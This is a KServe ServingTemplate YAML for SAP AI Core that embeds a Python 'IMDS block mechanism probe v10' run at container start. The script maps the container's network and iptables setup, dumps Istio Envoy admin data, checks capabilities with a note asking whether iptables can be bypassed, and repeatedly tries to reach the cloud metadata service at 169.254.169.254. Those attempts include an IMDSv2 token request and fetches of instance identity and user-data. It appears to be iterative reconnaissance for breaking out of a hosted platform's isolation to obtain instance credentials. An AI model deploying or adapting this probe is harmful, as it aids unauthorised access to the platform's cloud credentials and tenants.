apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: impact-probe-v10
  labels:
    scenarios.ai.sap.com/id: "impact-probe-v10"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "impact-probe-v10"
    executables.ai.sap.com/name: "impact-probe-v10"
    executables.ai.sap.com/description: "IMDS block mechanism probe v10"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            cat > /tmp/probe.py << 'PYEOF'
            import os, socket, subprocess, errno, ssl, time
            import urllib.request, urllib.error

            def report(k, v):
                print(f"[P10] {k}: {str(v)[:6000]}", flush=True)

            def run(cmd, timeout=8):
                try:
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                                  timeout=timeout)
                    return out.decode(errors="replace").strip()
                except subprocess.TimeoutExpired:
                    return "TIMEOUT"
                except subprocess.CalledProcessError as e:
                    return e.output.decode(errors="replace").strip()
                except Exception as e:
                    return f"ERR:{e}"

            def http_req(method, url, headers=None, data=None, timeout=8):
                try:
                    req = urllib.request.Request(url, data=data, headers=headers or {},
                                                 method=method)
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                        return r.read().decode(errors="replace"), r.status, dict(r.headers)
                except urllib.error.HTTPError as e:
                    body = ""
                    try: body = e.read().decode(errors="replace")[:2000]
                    except: pass
                    return f"HTTP_{e.code}:{body}", e.code, dict(e.headers)
                except Exception as e:
                    return f"ERR:{type(e).__name__}:{e}", 0, {}

            # ── 1. PROCESS LIST — confirm Istio sidecar presence ─────────────────
            report("---", "=== 1. RUNNING PROCESSES (is Istio sidecar present?) ===")
            report("PS_AUX", run("ps aux"))
            report("LS_PROC_EXE", run("ls -la /proc/*/exe 2>/dev/null | grep -v 'No such\\|Permission' | head -30"))

            # ── 2. NETWORK INTERFACES ─────────────────────────────────────────────
            report("---", "=== 2. NETWORK INTERFACES + ROUTES ===")
            report("IP_ADDR", run("ip addr show"))
            report("IP_ROUTE", run("ip route show"))
            report("IP_ROUTE_ALL_TABLES", run("ip route show table all 2>/dev/null | head -60"))
            report("IP_RULE", run("ip rule show"))

            # ── 3. IPTABLES NAT TABLE — Istio intercept rules ─────────────────────
            report("---", "=== 3. IPTABLES RULES (Istio interception) ===")
            for table in ["nat", "mangle", "filter"]:
                out = run(f"iptables -L -n -v -t {table} 2>&1")
                report(f"IPTABLES_{table.upper()}", out)
            # Also try iptables-save for a cleaner view
            report("IPTABLES_SAVE", run("iptables-save 2>&1 | head -120"))

            # ── 4. RAW TCP CONNECT — exact errno for 169.254.169.254 ─────────────
            report("---", "=== 4. RAW TCP CONNECT (errno analysis) ===")
            IMDS_HOST = "169.254.169.254"
            for port in [80, 443, 8080]:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(6)
                try:
                    s.connect((IMDS_HOST, port))
                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "CONNECTED (open!)")
                    # If we get here, send HTTP GET
                    s.sendall(b"GET /latest/meta-data/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n")
                    time.sleep(1)
                    data = s.recv(4096)
                    report(f"RAW_TCP_{IMDS_HOST}:{port}_RESPONSE", data.decode(errors="replace")[:1000])
                    s.close()
                except socket.timeout:
                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "ETIMEDOUT (packet dropped/no reply — likely hop-limit or firewall)")
                except ConnectionRefusedError:
                    report(f"RAW_TCP_{IMDS_HOST}:{port}", "ECONNREFUSED (TCP RST received — port closed at destination)")
                except OSError as e:
                    report(f"RAW_TCP_{IMDS_HOST}:{port}", f"OSError errno={e.errno} ({errno.errorcode.get(e.errno,'?')}): {e}")
                except Exception as e:
                    report(f"RAW_TCP_{IMDS_HOST}:{port}", f"{type(e).__name__}: {e}")
                finally:
                    try: s.close()
                    except: pass

            # ── 5. IMDSv2 — PUT token request (different from GET) ───────────────
            report("---", "=== 5. IMDSv2 PUT TOKEN REQUEST ===")
            body, code, hdrs = http_req(
                "PUT", "http://169.254.169.254/latest/api/token",
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                timeout=8
            )
            report("IMDS_PUT_TOKEN", f"[{code}] hdrs={dict(list(hdrs.items())[:6])} body={body[:500]}")

            # ── 6. IMDS via different paths and methods ───────────────────────────
            report("---", "=== 6. IMDS PATH/METHOD VARIATIONS ===")
            for path in ["/latest/meta-data/", "/latest/dynamic/instance-identity/document",
                         "/latest/user-data", "/", "/latest/"]:
                body, code, hdrs = http_req("GET", f"http://169.254.169.254{path}", timeout=6)
                report(f"IMDS_GET{path.replace('/','_')}", f"[{code}] {body[:300]}")

            # ── 7. TRACEROUTE to 169.254.169.254 — how many hops before drop ─────
            report("---", "=== 7. TRACEROUTE / TRACEPATH to IMDS ===")
            report("TRACEROUTE_IMDS", run("traceroute -n -m 5 -w 2 169.254.169.254 2>&1", timeout=30))
            report("TRACEPATH_IMDS",  run("tracepath -n 169.254.169.254 2>&1 | head -10", timeout=15))

            # ── 8. PING (ICMP) — does the address respond at L3? ─────────────────
            report("---", "=== 8. ICMP PING ===")
            report("PING_IMDS",    run("ping -c 3 -W 2 169.254.169.254 2>&1"))
            report("PING_GATEWAY", run("ping -c 2 -W 2 169.254.1.1 2>&1"))

            # ── 9. /proc/net — TCP connection state table ─────────────────────────
            report("---", "=== 9. /proc/net/tcp (kernel connection table) ===")
            report("PROC_NET_TCP", run("cat /proc/net/tcp | head -30"))
            report("PROC_NET_IF_INET6", run("cat /proc/net/if_inet6 2>/dev/null"))
            # Kernel network stats
            report("PROC_NET_NETSTAT", run("cat /proc/net/netstat | head -10"))

            # ── 10. CAPABILITIES — can we bypass iptables? ───────────────────────
            report("---", "=== 10. CAPABILITIES ===")
            report("CAP_CURRENT", run("cat /proc/self/status | grep -i cap"))
            report("CAPSH", run("capsh --print 2>/dev/null || echo 'capsh not found'"))

            # ── 11. ISTIO ENVOY ADMIN PORT (15000) ───────────────────────────────
            report("---", "=== 11. ISTIO ENVOY ADMIN (if sidecar present) ===")
            body, code, _ = http_req("GET", "http://127.0.0.1:15000/clusters", timeout=4)
            report("ENVOY_CLUSTERS", f"[{code}] {body[:2000]}")
            body, code, _ = http_req("GET", "http://127.0.0.1:15000/config_dump", timeout=6)
            report("ENVOY_CONFIG_DUMP_LEN", f"[{code}] response_len={len(body)} preview={body[:500]}")
            body, code, _ = http_req("GET", "http://127.0.0.1:15000/stats?filter=imds", timeout=4)
            report("ENVOY_STATS_IMDS", f"[{code}] {body[:1000]}")
            # Envoy listener list
            body, code, _ = http_req("GET", "http://127.0.0.1:15000/listeners", timeout=4)
            report("ENVOY_LISTENERS", f"[{code}] {body[:2000]}")

            # ── 12. CONNTRACK — what happens to 169.254.169.254 packets ──────────
            report("---", "=== 12. CONNTRACK ===")
            report("CONNTRACK_LIST", run("conntrack -L 2>&1 | head -20 || cat /proc/net/nf_conntrack 2>&1 | head -20"))

            report("DONE", "probe v10 complete")
            PYEOF
            python3 /tmp/probe.py 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
          ports:
          - containerPort: 8080
            protocol: TCP
          readinessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 15
